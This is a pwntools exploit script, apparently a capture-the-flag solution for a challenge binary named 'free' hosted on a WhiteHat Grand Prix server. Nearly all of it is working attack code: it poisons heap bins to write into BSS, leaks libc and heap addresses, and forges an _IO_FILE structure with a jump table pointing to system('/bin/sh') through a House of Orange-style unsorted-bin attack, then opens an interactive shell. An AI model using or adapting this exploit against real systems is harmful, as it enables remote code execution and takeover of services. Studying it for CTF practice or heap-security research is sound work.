from pwn import *

def add(size, data):
    r.recvuntil('Your choice:')
    r.send('1')
    r.recvuntil('Size of chunk:')
    r.send(str(size))
    r.recvuntil('Leave something in the chunk:')
    r.send(data)

def edit(index, data):
    r.recvuntil('Your choice:')
    r.send('2')
    r.recvuntil('Index:')
    r.send(str(index))
    r.recvuntil('Leave something in the chunk:')
    r.send(data)

def show(index):
    r.recvuntil('Your choice:')
    r.send('3')
    r.recvuntil('Index:')
    r.send(str(index))
    return r.recvline()

def info(ans = True, newname= None):
    r.recvuntil('Your choice:')
    r.send('4')
    txt = r.recvuntil('(1.yes/0.no)')
    if ans:
        r.send("1")
        r.recvuntil('New name:')
        r.send(newname)
    return txt


libc = ELF('libc.so.6')
r = remote('free.grandprix.whitehatvn.com', 4597)
env = {
    'LD_PRELOAD': './libc.so.6'
}
# libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
# r = process('./free', env = env)
# gdb.attach(r, "b*0x000000000400C18")

r.recvuntil("What's your name?")
r.send("aa")
r.recvuntil("What's your age?")
r.send(str(0x30))

ageaddr = 0x602058

log.info("free name")
info(True, "\x00")
log.info("malloc 0x28")
add(0x28, "\x00") #0
log.info("free name")
info(True, "\x00")
log.info("malloc 0x28")
edit(0, p64(ageaddr-8))
log.info("malloc 0x28")
add(0x20, p64(ageaddr-8)) #1
log.info("malloc 0x28 in to bss")
add(0x28, "a"*0x20+p64(0x4000)) #2
add(0x200-0x30, "xx")
edit(0, "a"*0x200+p64(0)+p64(0xdf1))
add(0x1000, "a")
show(0)
edit(0, "a"*0x210)
tmp = show(0).strip()+"\x00"*8
main_arena = u64(tmp[0x210:0x218])-0x58
log.info("main arena: %#x" %main_arena)
base = main_arena - 0x3c4b20
system = base + libc.symbols['system']
log.info("base: %#x", base)
log.info("system: %#x", system)
edit(0, "a"*0x20+p64(0)+p64(0x1f1)+p64(0)*((0x200-0x30)/8)+p64(0)+p64(0xdd1))
add(0x200, "A")
edit(0, "a"*0x220)
tmp = show(0).strip()+"\x00"*8
heap = u64(tmp[0x220:0x228])-0x200
log.info("heap: %#x" %heap)
top_chunk = heap+0x410
log.info("top chunk: %#x" %top_chunk)
jmp_table = top_chunk+0x60
payload = "a"*0x20+p64(0)+p64(0x1f1)+p64(0)*((0x200-0x30)/8)+p64(0)+p64(0x211)
payload += p64(main_arena+0x58)
payload += p64(heap+0x200)
payload += p64(0)*(0x1f0/8)
payload += "/bin/sh\x00"
payload += p64(0x61) #fake file pointer
payload += p64(main_arena+88) #main_arena unsorted-bin-list
payload += p64(main_arena+88+0x9a8-0x10) #__IO_list_all-0x10
payload += p64(2) #_IO_write_base
payload += p64(3) #_IO_write_ptr
payload += p64(0)*9 #padding to &jmptable[3]
payload += p64(system) #jump_table[3] = (size_t) &winner
payload += p64(0)*11 #padding to (size_t) fp + sizeof(_IO_FILE)
payload += p64(jmp_table) #*(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table;
edit(0, payload)
show(0)
# add(0x101, "a")
r.recvuntil('Your choice:')
r.send('1')
r.recvuntil('Size of chunk:')
r.send(str(0x101))
r.interactive()